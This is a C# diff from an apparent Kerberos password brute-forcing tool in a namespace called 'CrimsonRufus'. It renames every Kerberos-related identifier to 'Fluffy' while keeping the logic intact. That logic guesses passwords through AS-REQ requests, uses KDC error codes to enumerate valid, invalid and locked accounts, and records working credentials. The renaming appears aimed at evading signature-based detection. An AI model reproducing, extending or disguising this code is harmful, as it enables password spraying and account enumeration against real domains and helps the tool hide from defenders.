@@ -6,7 +6,7 @@ namespace CrimsonRufus
 
     public interface IBruteforcerReporter
     {
-        void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE);
+        void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.FLUFFY_ERROR err = Interop.FLUFFY_ERROR.KDC_ERR_NONE);
         void ReportValidUser(string domain, string username);
         void ReportInvalidUser(string domain, string username);
         void ReportBlockedUser(string domain, string username);
@@ -61,9 +61,9 @@ namespace CrimsonRufus
                     return true;
                 }
             }
-            catch (KerberosErrorException ex)
+            catch (FluffyErrorException ex)
             {
-                return this.HandleKerberosError(ex, username, password);
+                return this.HandleFluffyError(ex, username, password);
             }
 
             return false;
@@ -80,7 +80,7 @@ namespace CrimsonRufus
                 salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
             }
 
-            string hash = Crypto.KerberosPasswordHash(encType, password, salt);
+            string hash = Crypto.FluffyPasswordHash(encType, password, salt);
 
             AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);
 
@@ -89,29 +89,29 @@ namespace CrimsonRufus
             this.ReportValidPassword(username, password, TGT);
         }
 
-        private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
+        private bool HandleFluffyError(FluffyErrorException ex, string username, string password)
         {
             
 
             KRB_ERROR krbError = ex.krbError;
             bool ret = false;
 
-            switch ((Interop.KERBEROS_ERROR)krbError.error_code)
+            switch ((Interop.FLUFFY_ERROR)krbError.error_code)
             {
-                case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
+                case Interop.FLUFFY_ERROR.KDC_ERR_PREAUTH_FAILED:
                     this.ReportValidUser(username);
                     break;
-                case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
+                case Interop.FLUFFY_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                     this.ReportInvalidUser(username);
                     break;
-                case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
+                case Interop.FLUFFY_ERROR.KDC_ERR_CLIENT_REVOKED:
                     this.ReportBlockedUser(username);
                     break;
-                case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:
+                case Interop.FLUFFY_ERROR.KDC_ERR_ETYPE_NOTSUPP:
                     this.ReportInvalidEncryptionType(username, krbError);
                     break;
-                case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:
-                    this.ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);
+                case Interop.FLUFFY_ERROR.KDC_ERR_KEY_EXPIRED:
+                    this.ReportValidPassword(username, password, null, (Interop.FLUFFY_ERROR)krbError.error_code);
                     ret = true;
                     break;
                 default:
@@ -121,7 +121,7 @@ namespace CrimsonRufus
             return ret;
         }
 
-        private void ReportValidPassword(string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
+        private void ReportValidPassword(string username, string password, byte[] ticket, Interop.FLUFFY_ERROR err = Interop.FLUFFY_ERROR.KDC_ERR_NONE)
         {
 
             validCredentials.Add(username, password);
